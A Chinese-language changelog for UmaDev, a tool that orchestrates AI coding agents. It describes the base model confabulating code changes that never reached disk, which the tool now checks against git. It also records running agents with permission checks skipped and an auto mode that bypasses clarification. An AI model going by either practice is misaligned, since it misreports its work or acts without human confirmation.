- **聊天防幻觉（anti-confabulation 五层防线）**：修复 agentic 聊天会**报告不存在的代码改动**（例如声称"重构了某方法、新增了某辅助函数"，但磁盘上根本没有）。根因是底座会复述会话记忆里"打算做"的自述当"已做"，且 UmaDev 此前对它零现实校验。现在：每个 agentic 轮注入**真实 `git status / diff`** 并强约束"改动陈述必须先核实磁盘、绝不凭记忆复述"（L1）；"做了哪些改动 / 当前状态 / 有没有做 X / 某某存不存在 / 测试过了吗"这类问题强制走 agentic（带 git 锚定），绝不进会编造的纯聊天（L2）；每轮结束**对比 git 前后快照列出真实改动**，底座声称改了但磁盘没变就醒目警告（L3）；截断/失败的轮标"可能未完成或未落盘"而非干净成功（L5）。全程 fail-open（git 不可用则跳过增强）。
- **run 不再停在 `0/9` 莫名"就绪"**：1.0.6 引入的三态锁把"同 PID → WouldBlock"排队信号也用在了**真执行路径**上，导致一旦本会话有残留锁，run 启动取锁就对自己中止、被静默吞掉 → 停在 `0/9` 看似卡死。现在拆分取锁意图：路由层仍 WouldBlock 排队，**执行层对本会话自己残留的锁回收接管**（同进程串行不可能真并发），只有外部活进程才拒绝；同时阻塞块出错会显式渲染 `[aborted] 本轮已中止 + 原因/恢复`，不再假装"就绪"。
- **安装后 PATH 兜底**：`npm i -g umadev` 后若命令所在目录不在 `$PATH` 上（Homebrew node 等环境的常见坑），装完立刻打印清晰双语警告 + 一行修复命令，而非让用户事后撞上无解释的 "command not found"。fail-open：每条路径退出码 0、整体 `try/catch`，绝不弄坏 `npm install`；仅全局安装生效，已在 PATH 上时完全静默。

## [1.0.6] — Windows 检测铁桶 · 交互硬化 · 锁与稳定性（含角色裁判团 · 自我进化记忆 · brownfield · 部署/PR · 信任分级）

### 修复与交互硬化（本轮重点）

- **Windows 底座检测铁桶**：修复 npm 安装的 claude / codex / opencode 在 Windows 上报 `os error 193`（命中了 npm 的裸 *nix 垫片而非 `.cmd`）。`resolve_program` 改为 PATHEXT 扩展名优先 + 遍历所有已知安装目录兜底（Homebrew / volta / bun / deno / yarn / pnpm / nvm / asdf / `~/.<base>/bin` / Windows Programs·Scoop·Choco·winget）+ `UMADEV_<NAME>_BIN` 显式逃生口——无论用什么方式安装都能识别。`umadev doctor` 同步改用该检测，不再出现"装了却报未检测到"的假阴性。
- **`run.lock` 三态化**：崩溃 / 被 Ctrl-C / 被杀留下的陈旧锁，按 PID 存活检测**立即回收**（不再卡 6 小时）；同一会话自冲突不再误报"另一个 umadev 占用"；仅当真有另一个存活进程时才拒绝，并给出强制清锁提示。
- **交互硬化（对标成熟终端 AI 产品）**：
  - 主对话**支持滚动回看**：PageUp/PageDown、Home/End、Ctrl+Alt+U/D（半页，避开 Ctrl-D 退出冲突）、Shift+↑↓、鼠标滚轮（`/mouse` 可开关）；小终端不再把状态栏 / 输入框挤出屏（最小尺寸提示卡）；窗口缩放即时重绘。
  - **永不"看着卡死"**：进度圈动画 + 超过 3 秒无输出时状态栏染红；所有长阻塞阶段先发 `[wait]` 再周期心跳（首拍约 3 秒）；opencode 底座补齐真流式（逐行实时回显），且慢首 token 不再被 120 秒看门狗误杀重跑。
  - **聊天能真干活**：新增 agentic 聊天——"审一下这段代码会不会出 bug""帮我看看这个报错"这类请求会驱动底座真正读文件 / 跑命令产出结果，而非只回一句"我来看看"。
  - **输入永不丢**：运行中输入排队即显 `[queued N]` 且多条不互相覆盖；无关进度提示不再误熄 thinking 动画；防止重复提交并发串台同一会话；运行中 Ctrl-C 直接中断；Esc 在 agentic 回合中只中断、不退出程序。
  - **错误可诊断**：超时 / 空回 / 失败附带根因猜测 + 下一步（引导 `umadev doctor` / `/redo`），质量门内联分数与前几条问题；`auto` 模式真正全自动（自动跳过澄清门）；用户可见文案补齐 zh-CN / zh-TW / en 三语。

### 新增（角色裁判团 · 自我进化记忆 · brownfield · 部署/PR · 信任分级）

- **角色裁判团（`critics`）**：把流水线里隐式扮演的角色（PM 立项 / tech-lead 文档评审 / 资深设计评审 / 验收总监）统一成 `RoleVerdict` schema + `RoleCritic` trait——每个角色在**只读的 fork 会话**上交叉评审共享工件并返回结构化裁决。fail-open、advisory-only（永不驱动循环终止）、绝不写盘、不新增模型端点（复用同一借来的脑）。
- **自我进化记忆升级**：`lessons` 的踩坑库按归一化签名去重并**频率驱动召回**；当某踩坑在修复后仍复发时，向底座请求一条更高层的纠正**策略**并把 `Reflection` 快照进 `.umadev/reflections/`；检索新增 HyDE 式"假设答案"查询扩展，经 RRF 与原 query 排名融合，叠加在既有 BM25↔向量双通道融合之上。
- **brownfield 接管（`adopt` / `umadev adopt`）**：接管既有仓库——探测技术栈 + 恢复 test/build/lint 命令 + 索引源码 + 从既有前端调用反推 API 契约 + 写 `UMADEV.md` 边界简报 + 落 `adopt.json` 基线标记（偏向增量改而非重写）。幂等、不改用户源码。
- **运行时证据（`verify --runtime` / `runtime_proof`）**：不止"能编译"——启动 dev server、对路由做 HTTP 探测，把真启动证据写 `.umadev/audit/runtime-proof.json`，并入 proof-pack。
- **部署闭环（`umadev deploy` / `deploy`）**：从工件探测部署目标（Vercel / Netlify / Fly / Cloudflare Pages / 容器镜像 / 静态托管），默认只打印配方；`--run` 经你已登录的平台 CLI 真部署并写 `deploy-proof.json`。UmaDev 不持有凭证、不注入任何东西。
- **PR 模式（`umadev pr` / `report --review` / `review` / `security`）**：`report --review` 跑 pre-PR 安全扫描并生成 PR 级评审报告；`umadev pr` 默认 dry-run，`--create` 才真正推送并 `gh pr create`。
- **信任分级模式（`trust` / `run --mode`）**：`plan`（只读、只研究+规划）/ `guarded`（默认、每道 gate 暂停）/ `auto`（全自动）三档。**不可逆动作**（.git / 网络 / 破坏性 shell）即便 `auto` 也始终二次确认。
- **新命令**：`usage`（worker token 用量 + 粗略成本）、`lessons`（高频踩坑 + 已验证模式）、`quick`（轻量单点改动）、`redo`（重跑某阶段）。

## [Unreleased] — 纯底座驱动 · 模型/推理同步 · 升级与卸载

### 移除
- **彻底移除第三方 API / 外部 provider 功能**:`/provider` 命令、provider 向导、`ProviderRoute`、HTTP 运行时(`OpenAiHttpRuntime` / `AnthropicHttpRuntime`)、`ProviderConfig`、`BrainSpec::CustomApi`、`[providers.*]` 配置——全部删除。UmaDev 不再拥有或代理任何模型端点,是纯底座驱动器。
- 离线模式降级为**内部 CI / 无底座兜底**,不再作为用户首启选项;首启引导简化为"选语言 → 选底座"。

### 新增 / 改进
- **共享底座模型**:不再强加 `--model`(默认空),底座用它自己配置的模型(登录默认 / 第三方 / 本地)。优先级:`/model` 覆盖 > 底座配置模型 > 空。
- **同步并显示底座的模型 + 推理强度**:选底座 / `/status` 读取并显示底座真实在用的模型(claude `settings.json`、codex `config.toml`、opencode `opencode.json`)与推理强度(claude `effortLevel`、codex `model_reasoning_effort`)——全程不覆盖,只展示。
- **`umadev update`** —— 经 npm 升级到最新版(非 npm 安装则给出升级指引)。
- **`umadev uninstall`** —— 完整清理:确认后删除 `~/.umadev` + 本项目治理钩子 + 二进制;`--base <x>` 保留为"仅卸治理钩子",`--yes` 跳过确认。

### 修复
- **[严重]** `umadev uninstall --base pre-commit` 会 `remove_file` 删光用户自己已有的 pre-commit 钩子 → 改为只剥离 UmaDev 追加的块、保留用户内容。
- `umadev run --model` 的 clap 默认值仍硬编码 `claude-sonnet-4-6`(会盖掉底座真实模型、搞崩第三方 claude)→ 改为默认空。
- 清除全仓 `/provider`、外部 API、`[providers.*]` 等死引用(模块文档 / init / doctor / examples / guide / README 三语言 / spec)。

## [1.0.0] - UmaDev 品牌重塑 · 三语 i18n · 商业级硬化

首个以 **UmaDev** 之名开源的版本(自 super-dev 全量重塑)。

### 品牌重塑(super-dev -> UmaDev)

- 二进制 `super-dev` -> `umadev`;10 个 crate `umadev-*`;Rust 模块 `umadev_*`;显示名 `UmaDev`。
- 运行时目录 `.super-dev/` -> `.umadev/`;配置 `~/.umadev/` 与 `.umadevrc`;环境变量 `SUPER_DEV_*` -> `UMADEV_*`。
- 规范 `UMADEV_HOST_SPEC_V1`;治理条款 `SD-*` -> `UD-*`。
- npm 包 `umadev` 与 `@umadev/cli-*`;仓库迁至 `github.com/umacloud/umadev`。
- 版本统一为 **1.0.0**(Cargo workspace + 8 path dep + npm + README)。

### 三语 i18n(简体中文默认 / 繁體中文 / English)

- 新 crate `umadev-i18n`:`Lang` + 系统语言检测(LC_ALL/LANG)+ 内嵌三语 catalog + parity 测试(缺键即失败)。
- **首次进入语言选择器**(系统检测为默认 + 即时切换 + 持久化);**`/lang` 运行时切换**;config 持久化。
- 文档三语:`README.md`(简,默认)/ `README.zh-TW.md`(繁)/ `README_EN.md`(英)。
- UI 文案逐步迁入 catalog:欢迎语、输入占位、首启 picker、gate 审核卡片、运行叙述、常用 slash 回执等。

### 商业级硬化(本轮审查修复)

- **借脑判断**改以 `Runtime::is_offline()` 为准(非 backend 字符串),外部 HTTP provider 用户的 worker + 五个智能裁判恢复生效。
- 钩子安装/卸载改**按命令后缀匹配**并自愈,升级换路径不再留孤儿死钩子;install 全程 fail-open;pre-commit 保留用户已有钩子 + 加 shebang。
- 治理误报修复:`SD-ARCH-017` 不再误判测试代码;`UD-ARCH-030` 不再把 Rust 路径 `umadev_host::` 当硬编码 host 配置。
- Windows RAG 阶段过滤(路径分隔符归一化);merge_prompt 加 ARG_MAX 上限防 E2BIG;知识索引硬上限 + 单次警告;OpenAPI 路径 key 加引号。

## [Unreleased] - 治理引擎扩展 + MCP/Skill/知识库平台 + CI/CD

### 产品打磨 — 可上线体验(取消/路由可见/门控防误触/验收多轮)

- **`/cancel` 取消运行中的流水线**:此前运行中卡住只能 Esc 退整个 app。新增 `/cancel`——event loop 保留 run 任务 `JoinHandle`,取消时 `abort()`(子进程 kill-on-drop 自动清理)+ 重置回输入态(已完成阶段产物保留,可续)。同时**兜住了门控误触重做**(误触可 /cancel 停)。+ 测试。
- **路由可见**:底座判断"聊天 vs 进流水线"此前不可见、同句话时而聊天时而启动多分钟流水线。现进流水线时显式打标「→ 判断为开发任务 · 进入 9 阶段流水线(想中途停用 /cancel)」,可预期。
- **门控防误触提示**:审核门卡片讲清"输入任何文字 = 按你的修改重做整个 block(几分钟,误触可 /cancel),只想通过就别输文字"。
- **任务级验收升级为多轮**:#1 从单轮打回升级为**最多 3 轮**,缺口清零或某轮无进展即停(不空转),残留进学习库。

### 架构深化 — 总监闭环闭合:任务级验收(最高杠杆)

- **[架构 #1] 任务级验收闭环**:此前总监**对照计划派活、却从不验收完成度**——`maybe_verify` 只跑构建/测试("能编译"≠"实现了每个任务"),质量门只评工件结构,`tasks.md` 写完再没读回。新增 `acceptance` 模块 + `run_task_acceptance`:后端阶段做完后,**复用 umadev-contract 解析架构 API 表**(确定性 Rust,不耗 LLM),逐个检查计划接口在真实 `src/` 里有没有实现证据;有缺口就**用持久化指令把具体缺口打回底座补齐**(一轮),再复检;仍未补齐的缺口**记进自学习库**(下次同栈项目提前规避)。这把 解读→拆解→派活→**对照计划验收**→交付 闭环真正闭合——从"一次性派活"升级为"对照自己的计划验收、不达标不放行"的总监。fail-open(无 API 表不误报)。+ 4 测试。

### 架构深化 — 通用治理(补实时治理不对称)

- **[架构 #5] 跨底座真实文件治理扫描**:实时 PreToolUse 钩子**只有 claude-code 有**;codex/opencode/外部 HTTP 的大脑写文件时**实时不受治理**,硬编码色/emoji 只能等最终质量门拦。新增 `run_governance_catchup`:在前端/后端阶段做完后,对**无实时钩子的大脑**扫描真实源码+样式文件(`scan_content_with_policy`),发现违规就**打回底座修一轮**(用设计 token 换硬编码色、图标库换 emoji)再复扫。给每颗借来的大脑都补上治理反馈回路,不只 claude。按 `capabilities().realtime_governance` 判断,claude 跳过(写时已拦)。+ 2 测试。

### 架构深化 — 借脑能力契约 + 总监闭环(对照"无脑外挂 Agent + 项目总监"定位)

按"UmaDev 是无脑外挂 Agent,借底座的大模型当大脑,做顶级项目总监"这个定位深审架构(派架构 agent 通读 runtime/host/runner/coach/lessons/governance),落地最高杠杆的几项调整:

- **[架构 #2] 借脑能力契约 `BrainCapabilities`**:借来的大脑能力各不相同(持久 /goal、流式、usage 上报、实时治理),此前散落成各处 `backend == "claude-code"` 字面量。新增 `Runtime::capabilities()`,每个驱动**声明一次**自己的能力(claude 四项全有、codex 仅流式、opencode 最保守),总监按能力查询适配,而非字符串匹配 host id。加第四种大脑从此是"改数据"而非"全仓 grep-patch"。
- **[架构 #3] /goal 升级为能力驱动 + codex/opencode 兜底**:`with_goal_mode` 不再判 `== "claude-code"`,改判 `capabilities().persistent_goal`。有原生持久模式的(claude)发 `/goal`;没有的(codex/opencode)发**prompt 级兜底**("这是多任务目标,严格按任务清单逐条做完、不要停,声明完成前再核对遗漏")——补上了此前 2/3 底座会中途停的洞。`/goal` 文案显式指向拆解产物(uiux/architecture/execution-plan)。
- **[架构 #8] 治理缺陷修复与结构缺陷阈值解耦**:此前治理缺陷(emoji/硬编码色/AI-slop)和结构缺陷混在同一个 vec,结构缺陷 >10 就整体放弃修复 —— 连治理这种**红线违规**也被一起跳过。现治理缺陷**永远**反馈修复,不受结构缺陷数量影响。

### 修复 — slash 命令"部分输入失效" + 新增 /goal 开发模式

- **[真实 bug] 输入部分命令回车提示"未知命令"**:输 `/dep` 看到面板高亮 `/deploy`,但回车提交的是字面 `/dep` → 报"未知命令"(得先按 Tab 补全)。像所有命令面板一样,现**回车直接执行高亮项**:当输入是裸的部分 verb(无参数)且非精确命令时,先补全到面板选中项再分发。`/usag`→`/usage`、`/dep`→`/deploy` 等都能一把回车跑通。+ 测试。(经核查:39 个已登记 verb 全部正确分发、事件循环用 `select!` 与运行并发不阻塞按键、overlay 正常——机制本身没问题,只差这个面板补全交互。)
- **[新增] /goal 开发模式(开发阶段)**:用户发任务后,到**前端/后端开发阶段**,把整理后的需求用 Claude Code 的持久化 `/goal` 指令发给底座("完成「需求」的前端/后端实现:…全部任务做完、构建与质量校验通过前不要停下"),让底座**持续做到完成**而非中途停下。在 worker 真正收到的提示词最前面注入(`merge_prompt` 先发 system,故 `/goal` 拼到 system 最前 → 成为底座读到的第一行)。仅开发阶段、仅 claude-code(有 /goal),研究/文档/Spec/质量/交付等有界单发阶段不注入;`UMADEV_NO_GOAL_MODE=1` 可关。+ 测试。

### 改进 — UIUX 设计系统：默认强制生效 + 反 AI-slop 进化

修复设计系统**两个结构性空洞**，让底座默认就产出精美、不像 AI 的商业级 UI（而非用户主动 `/design` 才生效）。

- **🔴 设计系统现在默认强制绑定（核心）**：新增**产品类型推理引擎**(`recommend_design_system`)——从需求关键词推断产品类型(内容/开发后台/消费教育/营销品牌/SaaS)→ 自动选定对应档位 → token 作为**强制契约**注入文档+前端阶段。优先级:用户 `/design` 显式选择 > UIUX 文档已声明方向 > 自动推荐。此前 token 只在用户手动 `/design` 时才绑定,默认只给 prose、档位随便挑;现在**默认就用我们的设计系统**。
- **设计档位从 5 扩到 8**：新增 `brutalist-bold`(瑞士/野兽派,机构/作品集/时尚/文化)、`glass-aurora`(克制玻璃拟态+极光,AI/生成式/web3)、`premium-luxury`(高端精致,奢侈/财富/汽车),各含完整 light+dark token/字阶/间距/组件/动效/Do-Don't。推理引擎相应扩展(高端奢侈→premium-luxury、AI 大模型→glass-aurora、作品集→brutalist-bold,验证默认绑定正确)。
- **反 AI-slop 正向规则(随档位默认绑定)**：新增 `design-systems/anti-ai-slop.md`——先定大胆方向(Motif)+真实参照("像 Linear 的信息密度");字体 reflex-reject(默认禁 Inter/Roboto/Playfair…);OKLCH + 60-30-10 + 禁 AI 紫/奶油米色带;contextual 阴影/atmospheric 背景;动效硬规格(120/220/420ms、退场 75%、禁 bounce、reduced-motion 必写);hero 标题按字数(>90 字符=头号 AI tell);结构变化("对称读作生成的");文案 tells;优先级规则表(HIG/Material);**break-default-aesthetic 10 条硬拒绝 + family-picker(强制选一个家族+AVOID) + thumbnail test(缩略图不应与其它 AI 项目雷同) + 生成顺序(Design Read→锁 token→骨架→实现)**。每次 UI 都随设计 token 一起注入。
- **UIUX 文档审查升级为契约 conformance**：`review_uiux` 从"数 -- 和 icon 字样"改为校验完整设计契约(视觉方向声明、≥8 语义 token、深色、字体+模块化字阶、间距刻度、**真实图标库名**而非"icon"字样、组件 7 态、动效、反模式段、且契约自身不得规定紫渐变),驱动 review→fix 产出完整 premium 契约。
- **机器可检设计质量 detector（从"建议"到"验证"）**：新增 `umadev-governance::design` 纯确定性、依赖无关、fail-open 检测器——扫描生成的 UI 源码(tsx/css/…)抓 7 个开源项目收敛的 slop 指纹,共 **9 条规则**:AI 靛紫调色板(#6366f1/#7c3aed/#667eea→#764ba2… HARD)、gradient-text、overused 主字体(Inter/Roboto 当主字体而非 fallback)、bounce/elastic 缓动(解析 cubic-bezier 过冲)、营销 buzzword(≥2)、编造指标、**cream-band**(AI 米色面 RGB 判定)、**em-dash 滥用**(≥5)、**占位名**(Jane Doe/Acme)。HARD/SOFT 分级,接入质量门"Design quality (code)"扫项目 UI 文件、命名具体 tell。13 测试。
- **美学家族目录(~30) + family-picker**：新增 `aesthetic-families.md`——全光谱具名家族(neumorphism/claymorphism/cyberpunk/bento/spatial/synthwave/Material You…),每个含定义/何时用/标志动作/何时别用。当 8 档不完全契合时强制**具名 commit 一个**而非回退 generic,binding 契约里指针引导。
- **pre-emit 6 轴自评门**：anti-ai-slop 加交付前自评(Philosophy/Hierarchy/Execution/Specificity/Restraint/Variety 各 1-5,任一 <3 必须先改再交)+ thumbnail test。
- **字体契约溯源(verify 是否真用了所选设计系统)**：质量门新增"Typography contract conformance"——`extract_fonts` 提取 UIUX 文档声明的字体 vs 代码实际用的字体,**代码里出现契约外的字体(且非系统 fallback)即判定漂移**(没真用锁定的排版系统),按漂移字体数扣分。这把"是否真的用了我们的设计系统"也机器化了。
- **工作流连贯性修复（站在底座视角，让注入对底座可消化）**：
  - **按阶段分配设计注入**：docs 阶段(写 UIUX 规格)只给绑定 token + 精简方向(309 行),不再灌整份实现期 anti-slop 硬规格;frontend 阶段(写代码)才给完整 anti-slop。此前 docs 提示词 ~75% 是实现规则,稀释本职。
  - **消除双重注入**：设计内容此前既被绑定契约内联、又被 BM25 从 `design-systems/` 重复检索(还会混入**别的档位**的 chunk,与所绑档位打架)。现 frontend 检索不再读 `design-systems/`,设计内容只注入一次(绑定契约),BM25 专注互补的前端标准。
  - **修检索过滤前缀 bug**：`filter_by_phase` 用 `path.starts_with(subdir)` 导致 `design` 误配 `design-systems`、`mobile` 误配 `mobile-x`;改为**路径段精确匹配**(`path==s || starts_with("{s}/")`)。
  - 验证:docs→frontend 档位绑定一致、流水线到 delivery+proof-pack、质量门跑全部设计校验。
- **下发缺失的深度资产**：`design-tokens-complete.md`(三层 token 架构) + `accessibility-complete.md`(完整 a11y)此前从不 seed,现已下发到每个项目并进检索。
- **治理检测增强**：反 slop 检测器现抓**最经典的 AI 渐变** `#667eea→#764ba2`(无需配粉色),radial-gradient 也覆盖。
- 新增测试(推理引擎映射各产品类型 / 默认绑定保证 / 经典 AI 渐变拦截);**1347 测试 0 失败**,clippy/fmt 干净。

### 改进 — 产品交互打磨 + 功能联动（2 路深度审计：用户旅程 + 架构连贯性）

把 UmaDev 当有竞争力的商业产品来打磨：修复"默认行为与文案自相矛盾"的连贯性裂缝，让功能串成一个产品。

- **审核门连贯性（最大裂缝）**：`auto_approve_gates` 默认 true 时，整个"审核门"体验被静默跳过,连最有价值的**澄清提问**也被自动跳过——用户被告知能掌控却看着流水线冲过所有检查点。修复:① **默认全自动**——`auto_approve_gates` 默认 true,且 Clarify 门在 auto 模式下也自动放行:Clarify 阶段不再审问用户,而是**自解合理假设**(用户可回复修正或在文档里复审),非技术用户只输一个需求即可端到端;`/manual` 恢复逐门暂停(含 Clarify);② 自主模式**显式化**(中文提示 + 指向 /manual);③ 新增 **`/manual`↔`/auto`** 会话级切换(此前只能手改 .umadevrc);④ gate 确认文案统一中文并说清下一步。
- **`/help` 信任修复**：原本硬列 **8 个不存在的 worker 命令**(/gemini /droid /qwen /kimi…)输入即报错;现从真实驱动注册表生成,只列 claude/codex/opencode;补回缺失的 **/preview /deploy /manual /auto /pitfalls /mcp /skill** 等;`/help` **可滚动**不再在小终端裁剪底部;`/config` 的 worker 提示同步修正。
- **功能联动**：① 交付完成卡片补上**「/preview 看效果 · /deploy 上线拿 URL」**(此前到了终点却不提示能上线);② **runner 现在 honor `.umadev/rules.toml`**——主生成路径与 hook/CI/MCP 治理策略一致(此前唯独主路径用默认策略,忽略用户的禁用/排除规则)。
- **视觉打磨**：状态进度条 `[done][run][todo]` → 几何字形 **`●◐○ N/9`**(更易读,仍无 emoji);picker 选中**未安装宿主时在 picker 内联红字提示**(此前提示推到看不见的聊天屏,像 Enter 没反应)。
- 新增回归测试(help 无幻影命令 / help 可滚动 / 状态字形 / picker 内联提示);**1344 测试 0 失败**,clippy/fmt 干净,e2e 流水线产出 proof pack。

### 可交付上线 — 用户体验摩擦修复（全旅程审计）+ 用量透明 + 上线就绪验证

站在使用者全旅程视角审计(首启→输入→门控→等待→报错→完成),修每一次 run 都会撞到的高影响摩擦:

- **[每次 run·最大痛点] opencode/外部 API 等待时是"假死"白屏**:这两类底座没有流式实现,回退到阻塞式 `complete`,整段多分钟调用期间**零输出**(只有转圈),用户以为卡死。新增**心跳**:runner 用 `tokio::select!` + 25s ticker,**仅当该底座本轮无任何流事件**时发"…仍在进行(已 m:ss)— 底座在后台干活"(claude/codex 有流式则永不打扰)。
- **[信任] 底座失败时静默降级成离线模板**:底座返回空/调用失败时本阶段改用离线模板占位,但提示太轻,用户可能把**骨架当成真实产物交付**。改为**响亮**提示:"本阶段改用离线模板占位(非真实生成,只是骨架),修好底座后 /redo 重跑拿真实产物" + 指向 /doctor。
- **[用量透明] `/usage` 不再恒为 0**:claude 流式的 `result` 行本就带真实 usage,新增 `extract_usage` 解析 input/output token(cache 读写折进 input)→ 填入 `CompletionResponse.usage` → runner 用真实 token 调 `record_usage`(此前恒传 0)。`/usage` 现在显示真实总 token,补上计量地基。+ 测试。
- **[可发现性] `/model` 现在按底座给候选**:此前只回显当前 + 3 个写死示例(还可能不属于当前底座,填错下次 run 才报错)。改为按 backend 给菜单:claude→opus/sonnet/haiku 别名或完整 id、codex→gpt-5.1-codex 等、opencode→provider/model 形式、外部→去 /provider 配。
- **上线就绪验证**:release 构建干净;版本四处一致(binary/Cargo/npm/README 均 4.6.0);离线全流程产出全部 12 份工件 + proof-pack + 成绩单;npm shim 对"不支持平台/未安装/本地 dev"都有可执行提示;**实时治理钩子实测生效**(emoji→deny、AI 紫硬编码色→deny 且给可执行理由、干净代码→allow)。

> 仍待做(更涉及流程,下一批):门控处任意非 `c` 文本静默重跑整块(应先确认)、首启 picker 把"已安装但未登录"显示成绿色 Ready、运行中无法 /cancel、chat-vs-pipeline 路由无可见标记。

### 修复/新增 — 三底座全方位适配（深读 claude-code / codex / opencode 官方文档+仓库）

3 路并行深读三个底座的**官方文档与官方仓库**(codex 甚至拉了 `rust-v0.141.0` 真实源码),逐 flag 对照适配器,修核心集成缺陷:

- **[真实 bug] 模型选择被吞**:claude 与 codex 适配器从不传 `--model`,`req.model` 只回显——用户 `/model` 选的模型对这两个底座**完全无效**(各跑自己默认)。新增共享 `model_args` 助手,claude/codex 的 `complete`+`complete_streaming` 都按需追加 `--model <id>`(跳过空值与测试占位)。+ 测试。
- **[真实 bug] codex 新建文件被标成 Edit**:解析器查 `kind == "create"`,但 codex 的 `PatchChangeKind` 实际序列化为 `add`/`update`/`delete`——每次新建文件在 TUI 都被误标 "Edit"。改为认 `add`(保留 `create` 前向兼容),并修正之前测的是 codex 永不发出的 `create` 的假测试。
- **[可靠性] opencode 可能在 headless 卡死**:opencode 适配器**没传** `--dangerously-skip-permissions`,若其默认要交互授权,非交互 `run` 会卡到超时。补上(env 可关),与 claude/codex 对齐。+ 测试。
- **[集成核心] 实时治理默认不生效**:治理 PreToolUse 钩子此前只有手动 `umadev install` 才装,普通 run 时底座的**真实文件写入不被实时治理**(只有交付质量门事后扫)。现 `run`/`continue --backend claude-code` 与 TUI 启动时**自动幂等安装**钩子(合并不覆盖用户 `.claude/settings.json`;对 codex/opencode/offline 无害,它们不读该钩子)——这才兑现 CLAUDE.md 承诺的"钩子自动注册"。e2e 验证:claude run 打印"实时 PreToolUse 钩子已激活"。
- **[架构真实 bug] 底座子进程跑错目录**:底座 subprocess 用 `default_workspace()`=进程 cwd 运行,而非流水线 `project_root`——`--project-root /其他路径` 时底座把 output/、src/、代码全写到**启动 cwd** 而非项目根,UmaDev 在项目根找不到产物。给 `HostDriver` 加 `set_workspace`,三驱动加 workspace 字段并用于 `complete`/`complete_streaming`;`run`/`continue`/TUI(经 `RouteTurn`/`build_brain`)都把 `project_root` 传进去。e2e 验证:从 A 目录启动、`--project-root B`,底座确实在 B 里跑。**副作用红利**:底座现在在项目根跑,claude 会自动发现项目根的 `.mcp.json`,MCP 工具随之可用。
- **[静默失败] claude max-turns/执行中止被当成功**:`result` 行带 `is_error:true`/`subtype:error_max_turns|error_during_execution` 时,其 `result` 字段是**错误消息而非答案**。此前直接当最终文本返回——一次达上限的截断会伪装成"短小的成功回复"。现:错误终止时不取该字段(回退到中止前真实的 assistant 文本)+ 发 `StreamEvent::Warning` 让用户看到"本阶段输出可能不完整"。+ 测试。
- 修正 codex resume 文档(此前称 resume 不接受 `--sandbox` 是错的;实际 `--sandbox/--model/--cd/bypass` 都被 reconcile,只有 `--color` 是 exec-root-only)。
- 适配确认大量正确:claude 的 `--print/--output-format/--session-id/--resume/--continue/--dangerously-skip-permissions` 与流式 stream-json 解析、codex 的 `exec/--sandbox/--json/resume --last` 与事件 schema、opencode 的 `run/--model provider/model/--continue` 均与官方现状一致。

> **全方位适配 roadmap(已识别,后续按需)**:`--mcp-config` 把 UmaDev 的 MCP 转发给底座让 worker 真能用;`--output-format json` 抓 `total_cost_usd`/usage(同时填上计量 token=0 的洞);claude `--include-partial-messages` 做 token 级流式;opencode `run --format json` 做流式/工具可见;`--allowedTools`/`--permission-mode dontAsk` 治理化授权;codex/opencode `error`/`turn.failed` 事件可见化。

### 新增 — 顶级产品/商业化视角（整体产品审计 + 大厂思维)

以顶级产品 + 商业产品的全方位视角审视用户全旅程,落地最高杠杆的几项(研究顶级大厂:aha≤3 分钟、消灭"空状态时刻"、用量计费+免费额度建信任、价值主张以结果为先):

- **可分享的交付成绩单(最高杠杆:信任 + 裂变)**：delivery 阶段生成 `release/scorecard-<slug>.html`——**完全自包含**(零外链,离线可开)、设计上自我遵守反 AI-slop(distinctive 字体/深色/token 色/无紫渐变/无 emoji)。展示:**UmaDev 独立验证**的质量综合分 + 逐项检查(分/状态/说明)+ 实时治理覆盖 + 合规框架(SOC2/ISO/EU)+ **proof-pack SHA-256 防篡改哈希**。用户可直接把它发给团队/客户/审计方作为交付证明。完成提示里明确引导打开/分享。
- **首启体验 value-first + 渐进式披露**：原 greeting 先讲角色和配置(工人/设计/模板)、冷启动就塞 MCP/Skill/Knowledge(噪音)。改为**先讲结果**("把一句话需求变成可上线的商业产品,你不用写一行代码")+ 可照抄的精选示例菜单 + 唯一明确下一步;砍掉冷启动噪音(挪 /help);设计系统已默认生效故不再硬推 /design。
- **[信任 bug] README_EN 幻影后端**：英文主页的后端表列了 cursor-agent/aider/goose/amp/junie/gemini/antigravity 等 ~15 个代码已拒绝的后端(实际硬锁 3 个,有测试)。改为只列真实的 claude-code/codex/opencode,并指明更广覆盖走外部 HTTP provider(/provider setup)。
- 验证:成绩单自包含/无 slop/含分数与哈希(测试锁定);**1370 测试 0 失败**。

### 修复 — 全工具链/工作链逐行审查（4 路并行 line-by-line + 自审）

逐模块、逐功能、逐行审查整条工具链与工作链(run→research→docs→gate→spec→frontend→gate→backend→quality→delivery→deploy + 宿主驱动 + 注入/验证),修复 9 个真实链路缺陷:

- **[CRITICAL] design 检测器在中文输入上 panic ×3**（最新代码）：`invented_metric`/`extract_fonts`/`overused_primary_font` 按字节切片(`idx-8`、`[..160]`、`[..120]`)落在 CJK 字符中间→panic,且喂给质量门无 `catch_unwind`,一个文件就让整个质量阶段崩。改为 `floor_boundary` 字符边界安全 + 回归测试。
- **[CRITICAL] 宿主层 `String::truncate(2048)` panic ×4**：本地化(中文)错误信息超 2048 字节且多字节字符跨界即 panic,违反 fail-open。统一 `truncate_on_boundary` 字符安全截断。
- **[HIGH] docs→frontend 绑定错档位**：`detect_declared_archetype` 扫全文 + 按 DESIGN_ARCHETYPES 数组序返回首个被**提及**的档位(哪怕只是对比/列表里出现)→前端绑定错的设计系统。改为只认 `## Visual direction` 段内**唯一**声明,否则回退确定性推荐 + 测试。
- **[HIGH] 帮助页击键泄漏**：`/help` 打开时输入字符会落进被遮挡的输入框,回车甚至**误启动一次 run**(我加滚动键时 `_=>{}` 落穿导致)。改为帮助页吞掉所有非滚动键。
- **[HIGH] 鉴权门误判失败**：架构表 auth 列名为 `Authentication`/`Protected`/`Security`(非精确 `Auth`)时被当全公开→所有写端点判定缺鉴权→score 0(权重 2.0)拖垮门。改为接受列名变体 + 无任何鉴权声明时降级为 warning(无法判定不硬失败)+ 测试。
- **[MEDIUM] 修订被静默丢弃**：`prefer_richer` 当新文档 < 旧文档一半即保留旧的→用户"把 PRD 改精简"时新稿被丢。改为仅当新输出是极短 stub(<200 字)才保留磁盘版,真实精简稿一律生效 + 测试。
- **[MEDIUM] 流式无总时长上限**：流式只有逐行 idle 超时,持续小量输出的流可无限运行超过 `call.timeout`。补总时长硬上限。
- **[MEDIUM] Arg 通道 stdin 管道不关**：三个宿主驱动用 Arg 通道但 stdin 管道开着不关,会读 stdin 的 CLI 会挂到超时。改为立即 take+drop 让子进程见 EOF。
